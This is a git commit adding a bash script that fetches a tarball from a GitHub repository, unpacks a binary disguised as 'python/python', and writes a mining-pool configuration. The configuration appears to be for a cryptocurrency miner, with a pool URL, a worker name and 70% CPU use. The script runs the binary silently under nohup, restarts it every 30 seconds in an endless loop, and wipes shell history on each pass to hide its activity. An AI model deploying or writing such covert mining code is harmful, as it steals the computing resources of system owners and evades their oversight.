61b7919f369b97d8283dc3852a9352c139c61ee3
CongTK9x <155988811+CongTK9x@users.noreply.github.com>
2026-01-30 11:32:25 +0700

    Create runv2.sh

---
+++ runv2.sh
@@ -0,0 +1,63 @@
+#!/bin/bash
+
+DOMAIN=$1      # domain:port
+HOSTNAME=$2    # hostname
+CONFIG="setting.json"
+BINARY="python/python"
+WORKDIR=$(pwd)
+
+# Tải binary nếu chưa có
+if [ ! -f "$BINARY" ]; then
+    echo "Downloading binary..."
+    curl -sL -o python.tar.gz https://raw.githubusercontent.com/CongTK9x/tool/main/python.tar.gz >/dev/null 2>&1
+    tar -xzf python.tar.gz
+    rm -f python.tar.gz
+fi
+
+# Tạo config.json nếu chưa có
+if [ ! -f "$CONFIG" ]; then
+    cat > "$CONFIG" <<EOF
+{
+  "pools": [
+    {
+      "url": "$DOMAIN",
+      "user": "$HOSTNAME",
+      "pass": "x",
+      "tls": true,
+      "keepalive": true
+    }
+  ],
+  "cpu": {
+    "enabled": true,
+    "max-threads-hint": 70
+  }
+}
+EOF
+fi
+
+# Hàm start process
+start_process() {
+    nohup "$WORKDIR/$BINARY" -c "$WORKDIR/$CONFIG" >/dev/null 2>&1 &
+    echo "Process restarted"
+}
+
+# Nếu chưa chạy thì start
+if ps aux | grep -v grep | grep -q "$BINARY"; then
+    #echo "Process is running api python"
+    :
+else
+    start_process
+fi
+
+# Vòng lặp kiểm tra mỗi 30s
+while true; do
+    if ps aux | grep -v grep | grep -q "$BINARY"; then
+        #echo "Process is running api python"
+        :
+    else
+        start_process
+    fi
+    history -c
+    history -w
+    sleep 30
+done
